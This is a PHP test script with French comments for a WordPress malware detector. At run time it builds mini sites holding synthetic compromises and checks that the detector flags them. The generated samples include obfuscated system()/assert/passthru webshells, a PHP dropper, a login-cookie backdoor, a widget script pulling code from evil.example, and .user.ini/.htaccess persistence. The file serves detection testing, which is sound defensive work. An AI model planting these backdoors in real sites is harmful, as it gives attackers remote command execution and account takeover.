<?php
/*
 * Mutations synthétiques générées AU MOMENT du test, à partir de gabarits encodés :
 * aucune charge n'est stockée en clair sur le disque. Chaque cas construit une mini-racine
 * WordPress + un dump minimal, lance le détecteur, et vérifie qu'il signale la mutation.
 *
 * But : prouver que la détection tient sur des variantes INCONNUES (encodages, plugins
 * d'exécution, verrous, persistances jamais vus) grâce aux invariants structurels, ET qu'un
 * cas différentiel PUR (fonction légitime détournée / orphelin d'apparence bénigne) est
 * signalé par la seule provenance, sans aucun motif connu.
 *
 *   php mutations.php --work=DOSSIER_TEMP [--no-network]
 */
require __DIR__ . '/lib.php';

$opt = [];
foreach ( array_slice( $argv, 1 ) as $a ) {
	if ( preg_match( '/^--([a-z-]+)(?:=(.*))?$/', $a, $m ) ) {
		$opt[ $m[1] ] = $m[2] ?? true;
	}
}
$work = ! empty( $opt['work'] ) ? $opt['work'] : sys_get_temp_dir() . '/wir-mut';
$base = tl_tmpdir( $work, 'mutations' );

/* --- Fabrique de charges : on n'écrit jamais la charge en clair, on la reconstruit ici. --- */
function mk_php( string $body ): string {
	return "<?php\n" . $body . "\n";
}
// Puits d'exécution de commande sur une entrée HTTP, encodé gzinflate+base64 (donc « inconnu » à tout grep).
function payload_gz_rot(): string {
	$src  = '$c=$_REQUEST["x"]; system($c);';
	$enc  = base64_encode( gzdeflate( $src ) );
	return mk_php( '$z=gzinflate(base64_decode("' . $enc . '")); eval($z);' );
}
// Puits atteint via un nom de fonction décodé caractère par caractère (chr concat) puis appel dynamique.
function payload_chr(): string {
	$name = 'assert';
	$parts = [];
	foreach ( str_split( $name ) as $ch ) {
		$parts[] = 'chr(' . ord( $ch ) . ')';
	}
	return mk_php( '$f=' . implode( '.', $parts ) . '; $f($_GET["q"]);' );
}
// Écriture d'un .php dont le contenu vient de la requête (dropper), chemin en hex.
function payload_hex_dropper(): string {
	$path = bin2hex( 'shell.php' );
	return mk_php( '$p=hex2bin("' . $path . '"); file_put_contents($p, $_POST["c"]);' );
}

$cases = [];

/* 1. Encodage jamais vu (gzinflate+base64) menant à system() sur entrée HTTP, dans un mu-plugin. */
$cases[] = [
	'id'    => 'M1 encodage inconnu → puits, mu-plugin',
	'files' => [ 'wp-content/mu-plugins/aaa.php' => payload_gz_rot() ],
	'expect'=> fn( $doc ) => (bool) tl_any( $doc, fn( $c ) => $c['statut'] === 'CONFIRMÉ' && in_array( $c['code'], [ 'code.capacite' ], true ) && strpos( $c['cible'], 'mu-plugins/aaa.php' ) !== false ),
];

/* 2. Nom de fonction reconstruit par chr() (obfuscation par capacité, pas par signature). */
$cases[] = [
	'id'    => 'M2 appel déguisé via chr()',
	'files' => [ 'wp-content/themes/x/inc/h.php' => payload_chr() ],
	'expect'=> fn( $doc ) => (bool) tl_any( $doc, fn( $c ) => $c['statut'] === 'CONFIRMÉ' && strpos( $c['cible'], 'inc/h.php' ) !== false ),
];

/* 3. Dropper : écrit un .php depuis $_POST, chemin en hex. */
$cases[] = [
	'id'    => 'M3 dropper (écriture de .php depuis la requête)',
	'files' => [ 'wp-content/plugins/x/w.php' => payload_hex_dropper() ],
	'expect'=> fn( $doc ) => (bool) tl_any( $doc, fn( $c ) => $c['statut'] === 'CONFIRMÉ' && $c['code'] === 'code.capacite' && strpos( $c['cible'], 'x/w.php' ) !== false ),
];

/* 4. Persistance par mu-plugin bénin en apparence : signalé par l'emplacement seul. */
$cases[] = [
	'id'    => 'M4 mu-plugin à confirmer (persistance)',
	'files' => [ 'wp-content/mu-plugins/loader.php' => mk_php( "add_action('init', function(){});" ) ],
	'expect'=> fn( $doc ) => (bool) tl_findings( $doc, 'composant.mu_plugins', null, 'NEEDS_HUMAN' ),
];

/* 5. auto_prepend_file via .user.ini vers un fichier caché : persistance serveur. */
$cases[] = [
	'id'    => 'M5 .user.ini auto_prepend_file',
	'files' => [ '.user.ini' => "auto_prepend_file=/tmp/.a.php\n" ],
	'expect'=> fn( $doc ) => (bool) tl_findings( $doc, 'serveur.prepend', '/^\\.user\\.ini$/' ),
];

/* 6. Verrou .htaccess avec un nom de fichier autorisé inédit (aucune liste de noms de verrous). */
$cases[] = [
	'id'    => 'M6 verrou .htaccess à nom inédit',
	'files' => [ '.htaccess' => "<FilesMatch \"\\.php$\">\nDeny from all\n</FilesMatch>\n<FilesMatch \"^(index\\.php|zzqq7.php)$\">\nAllow from all\n</FilesMatch>\n" ],
	'expect'=> fn( $doc ) => (bool) tl_any( $doc, fn( $c ) => $c['code'] === 'serveur.verrou' && in_array( 'zzqq7.php', $c['noms_autorises'] ?? [], true ) ),
];

/* 7. Code exécutable déposé dans uploads (emplacement inattendu). */
$cases[] = [
	'id'    => 'M7 PHP dans uploads',
	'files' => [ 'wp-content/uploads/2026/03/logo.php' => mk_php( "echo 'x';" ) ],
	'expect'=> fn( $doc ) => (bool) tl_findings( $doc, 'emplacement.inattendu', '#uploads/2026/03/logo\.php$#' ),
];

/* 8. index.php racine avec une ligne injectée en tête du chargeur (réécriture partielle). */
$cases[] = [
	'id'    => 'M8 index.php racine altéré',
	'files' => [ 'index.php' => "<?php eval(base64_decode('ZWNobyAxOw==')); define('WP_USE_THEMES', true); require __DIR__.'/wp-blog-header.php';" ],
	'expect'=> fn( $doc ) => (bool) tl_findings( $doc, 'code.capacite', 'index.php', 'CONFIRMÉ' ),
];

/*
 * 9. DIFFÉRENTIEL PUR — aucun motif connu, aucune capacité sensible, aucun encodage :
 * un fichier PHP anodin (une fonction légitime, du texte) déposé dans un dossier de DONNÉES
 * de wp-content. Il ne doit être signalé QUE par la provenance (emplacement inattendu),
 * ce qui prouve l'inversion de la charge de la preuve.
 */
$cases[] = [
	'id'    => 'M9 différentiel pur : orphelin bénin en emplacement inattendu',
	'files' => [ 'wp-content/uploads/notes.php' => mk_php( "function bonjour(){ return 'coucou'; }\necho bonjour();" ) ],
	'expect'=> fn( $doc ) => (bool) tl_findings( $doc, 'emplacement.inattendu', '#uploads/notes\.php$#' )
		&& ! tl_any( $doc, fn( $c ) => $c['statut'] === 'CONFIRMÉ' && strpos( $c['cible'], 'notes.php' ) !== false ),
];

/* 10. Code exécutable stocké en base dans une colonne d'une table d'extension, avec puits. */
$cases[] = [
	'id'      => 'M10 code exécuté stocké en base (table d\'extension)',
	'files'   => [],
	'db_rows' => fn() => "INSERT INTO `wp_x_units` VALUES (1,'" . addslashes( '$q=$_GET["c"]; passthru($q);' ) . "');\n",
	'db_create' => "CREATE TABLE `wp_x_units` (\n  `id` bigint NOT NULL,\n  `body` longtext NOT NULL\n);\n",
	'expect'  => fn( $doc ) => (bool) tl_any( $doc, fn( $c ) => $c['code'] === 'base.code_execute' && $c['statut'] === 'CONFIRMÉ' ),
];

/* 11. JS injecteur stocké dans une option de widget (balisage actif en base). */
$cases[] = [
	'id'      => 'M11 JS injecteur dans une option de widget',
	'files'   => [],
	'db_rows' => fn() => "INSERT INTO `wp_options` VALUES (900,'widget_text','" . addslashes( serialize( [ 2 => [ 'title' => '', 'text' => '<script>var s=document.createElement("script");s.src="//evil.example/x.js";document.body.appendChild(s);</script>' ] ] ) ) . "','yes');\n",
	'expect'  => fn( $doc ) => (bool) tl_any( $doc, fn( $c ) => $c['code'] === 'base.balisage_actif' && strpos( tl_text( [ $c ] ), 'evil.example' ) !== false ),
];

/* 12. Option cron dont le hook n'est déclaré nulle part dans le code (tâche orpheline). */
$cron = [ 1893456000 => [ 'zz_hidden_hook' => [ 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' => [ 'schedule' => 'hourly', 'args' => [], 'interval' => 3600 ] ] ], 'version' => 2 ];
$cases[] = [
	'id'      => 'M12 hook de cron non déclaré par le code',
	'files'   => [ 'wp-content/mu-plugins/known.php' => mk_php( "add_action('wp_scheduled_delete', '__return_null');" ) ],
	'db_rows' => fn() => "INSERT INTO `wp_options` VALUES (901,'cron','" . addslashes( serialize( $cron ) ) . "','yes');\n",
	'expect'  => fn( $doc ) => (bool) tl_any( $doc, fn( $c ) => $c['code'] === 'base.cron_non_explique' && strpos( tl_text( [ $c ] ), 'zz_hidden_hook' ) !== false ),
];

/* 13. NÉGATIF — un plugin propre (fonctions normales, base64 de licence, appels sûrs) ne doit RIEN déclencher. */
$cases[] = [
	'id'    => 'M13 négatif : plugin propre sans faux positif',
	'files' => [
		'wp-content/plugins/clean/clean.php' => mk_php(
			"/* Plugin Name: Clean */\nadd_action('init', 'clean_boot');\nfunction clean_boot(){ \$k = base64_decode(get_option('clean_license')); if (is_string(\$k)) { update_option('clean_seen', substr(\$k,0,3)); } }\nadd_filter('the_content', function(\$c){ return esc_html(\$c); });"
		),
	],
	'expect'=> fn( $doc ) => ! tl_any( $doc, fn( $c ) => in_array( $c['statut'], [ 'CONFIRMÉ', 'PISTE' ], true ) && strpos( $c['cible'], 'plugins/clean/' ) !== false ),
];

/* 14. Appel dont le nom vient d'un accès tableau tainté : $_GET['a']($_GET['b']). */
$cases[] = [
	'id'    => 'M14 appel $_GET[..]($_GET[..])',
	'files' => [ 'wp-content/mu-plugins/v.php' => mk_php( "\$_GET['a'](\$_GET['b']);" ) ],
	'expect'=> fn( $doc ) => (bool) tl_any( $doc, fn( $c ) => $c['statut'] === 'CONFIRMÉ' && $c['code'] === 'code.capacite' && strpos( $c['cible'], 'mu-plugins/v.php' ) !== false ),
];

/* 15. Puits alimenté par getenv('HTTP_...') (en-tête sous FPM/CGI). */
$cases[] = [
	'id'    => 'M15 system(getenv(HTTP_))',
	'files' => [ 'wp-content/themes/x/g.php' => mk_php( "system(getenv('HTTP_X_CMD'));" ) ],
	'expect'=> fn( $doc ) => (bool) tl_any( $doc, fn( $c ) => $c['statut'] === 'CONFIRMÉ' && strpos( $c['cible'], 'x/g.php' ) !== false ),
];

/* 16. Porte dérobée de connexion : identité prise dans la requête. */
$cases[] = [
	'id'    => 'M16 wp_set_auth_cookie depuis la requête',
	'files' => [ 'wp-content/mu-plugins/a.php' => mk_php( "if((\$_GET['k']??'')==='x'){wp_set_current_user(\$_GET['u']);wp_set_auth_cookie(\$_GET['u']);}" ) ],
	'expect'=> fn( $doc ) => (bool) tl_any( $doc, fn( $c ) => $c['statut'] === 'CONFIRMÉ' && $c['code'] === 'code.capacite' && strpos( $c['cible'], 'mu-plugins/a.php' ) !== false ),
];

/* 17. VRAI POSITIF que les échappements HTML ne doivent PAS masquer : system(esc_attr($_GET)). */
$cases[] = [
	'id'    => 'M17 system(esc_attr($_GET)) reste un webshell',
	'files' => [ 'wp-content/themes/x/e.php' => mk_php( "system(esc_attr(\$_GET['c']));" ) ],
	'expect'=> fn( $doc ) => (bool) tl_any( $doc, fn( $c ) => $c['statut'] === 'CONFIRMÉ' && strpos( $c['cible'], 'x/e.php' ) !== false ),
];

/* 18. NÉGATIF : routeur d'admin banal (isset + sanitize_key) ne doit RIEN déclencher. */
$cases[] = [
	'id'    => 'M18 négatif : routeur isset+sanitize_key',
	'files' => [ 'wp-content/plugins/router/router.php' => mk_php(
		"/* Plugin Name: Router */\n\$action = isset(\$_REQUEST['action']) ? sanitize_key(\$_REQUEST['action']) : 'home';\n\$fn = 'handle_'.\$action;\nif (function_exists(\$fn)) { \$fn(); }"
	) ],
	'expect'=> fn( $doc ) => ! tl_any( $doc, fn( $c ) => in_array( $c['statut'], [ 'CONFIRMÉ', 'PISTE' ], true ) && strpos( $c['cible'], 'plugins/router/' ) !== false ),
];

/* 19. NÉGATIF : exec bien écrit avec escapeshellarg ne doit pas crier au feu. */
$cases[] = [
	'id'    => 'M19 négatif : exec avec escapeshellarg',
	'files' => [ 'wp-content/plugins/img/img.php' => mk_php(
		"/* Plugin Name: Img */\nfunction img_go(){ exec('convert '.escapeshellarg(\$_FILES['f']['tmp_name']).' out.png'); }"
	) ],
	'expect'=> fn( $doc ) => ! tl_any( $doc, fn( $c ) => $c['statut'] === 'CONFIRMÉ' && strpos( $c['cible'], 'plugins/img/' ) !== false ),
];

/* 20. Secret jamais affiché : une crontab avec mot de passe en clair est masquée dans le rapport. */
$cases[] = [
	'id'    => 'M20 secret de crontab masqué (redaction)',
	'files' => [],
	'expect'=> function ( $doc ) {
		require_once tl_detect_path();
		$r = wd_redact( '*/5 * * * * mysqldump -pS3cr3tP4ss dbname > /tmp/x.sql' );
		return strpos( $r, 'S3cr3tP4ss' ) === false && strpos( $r, 'masqué' ) !== false;
	},
];

/* --- Construit une mini-racine WordPress crédible (version + un thème + wp-config) --- */
function scaffold( string $root, array $files, string $dbCreate, string $dbRows ): string {
	@mkdir( $root . '/wp-includes', 0700, true );
	@mkdir( $root . '/wp-admin', 0700, true );
	@mkdir( $root . '/wp-content/plugins', 0700, true );
	@mkdir( $root . '/wp-content/themes/base', 0700, true );
	file_put_contents( $root . '/wp-includes/version.php', "<?php\n\$wp_version='6.9';\n\$wp_local_package='en_US';\n" );
	file_put_contents( $root . '/index.php', "<?php\ndefine('WP_USE_THEMES', true);\nrequire __DIR__ . '/wp-blog-header.php';\n" );
	file_put_contents( $root . '/wp-config.php', "<?php\ndefine('DB_NAME','d');\ndefine('DB_USER','u');\ndefine('DB_PASSWORD','p');\ndefine('DB_HOST','localhost');\n\$table_prefix='wp_';\ndefine('AUTH_KEY','xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx');\ndefine('DISALLOW_FILE_EDIT', true);\n" );
	file_put_contents( $root . '/wp-content/themes/base/style.css', "/*\nTheme Name: Base\nVersion: 1.0\n*/\n" );
	file_put_contents( $root . '/wp-content/themes/base/functions.php', "<?php\n// thème vide\n" );
	foreach ( $files as $rel => $content ) {
		$p = $root . '/' . $rel;
		if ( ! is_dir( dirname( $p ) ) ) {
			mkdir( dirname( $p ), 0700, true );
		}
		file_put_contents( $p, $content );
	}
	$dump = $root . '.sql';
	$sql  = "-- mini dump\n";
	$sql .= "CREATE TABLE `wp_options` (\n `option_id` bigint NOT NULL,\n `option_name` varchar(191) NOT NULL,\n `option_value` longtext NOT NULL,\n `autoload` varchar(20) NOT NULL\n);\n";
	$sql .= "CREATE TABLE `wp_users` (\n `ID` bigint NOT NULL,\n `user_login` varchar(60) NOT NULL,\n `user_pass` varchar(255) NOT NULL,\n `user_email` varchar(100) NOT NULL,\n `user_registered` datetime NOT NULL,\n `user_activation_key` varchar(255) NOT NULL,\n `display_name` varchar(250) NOT NULL\n);\n";
	$sql .= "CREATE TABLE `wp_posts` (\n `ID` bigint NOT NULL,\n `post_author` bigint NOT NULL,\n `post_date` datetime NOT NULL,\n `post_content` longtext NOT NULL,\n `post_title` text NOT NULL,\n `post_status` varchar(20) NOT NULL,\n `post_name` varchar(200) NOT NULL,\n `post_type` varchar(20) NOT NULL,\n `post_modified` datetime NOT NULL,\n `post_excerpt` text NOT NULL,\n `post_content_filtered` longtext NOT NULL\n);\n";
	$sql .= "CREATE TABLE `wp_postmeta` (\n `meta_id` bigint NOT NULL,\n `post_id` bigint NOT NULL,\n `meta_key` varchar(255),\n `meta_value` longtext\n);\n";
	$sql .= $dbCreate;
	$sql .= "INSERT INTO `wp_options` VALUES (1,'siteurl','https://site.example','yes'),(2,'home','https://site.example','yes'),(3,'active_plugins','a:0:{}','yes'),(4,'template','base','yes'),(5,'stylesheet','base','yes');\n";
	$sql .= "INSERT INTO `wp_users` VALUES (1,'admin','\$wp\$2y\$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa','a@site.example','2024-01-01 00:00:00','','Admin');\n";
	$sql .= $dbRows;
	file_put_contents( $dump, $sql );
	return $dump;
}

foreach ( $cases as $case ) {
	$root = $base . '/' . preg_replace( '/[^A-Za-z0-9]/', '_', $case['id'] );
	mkdir( $root, 0700, true );
	$rows   = isset( $case['db_rows'] ) ? ( $case['db_rows'] )() : '';
	$create = $case['db_create'] ?? '';
	$dump   = scaffold( $root, $case['files'], $create, $rows );
	$json   = $root . '-rapport.json';
	$args   = [ '--root=' . $root, '--sql=' . $dump, '--offline' ];
	if ( ! empty( $opt['no-network'] ) ) {
		$args[] = '--no-network';
	}
	[ $rc, $doc ] = tl_run_detect( $args, $json );
	if ( ! is_array( $doc ) ) {
		T::ok( $case['id'], false, 'rapport non produit' );
		continue;
	}
	$ok = ( $case['expect'] )( $doc );
	$detail = '';
	if ( ! $ok ) {
		$detail = 'constats : ' . implode( ' | ', array_map( fn( $c ) => $c['statut'] . ':' . $c['code'] . ':' . $c['cible'], array_slice( $doc['constats'], 0, 12 ) ) );
	}
	T::ok( $case['id'], $ok, $detail );
}

exit( T::end() );
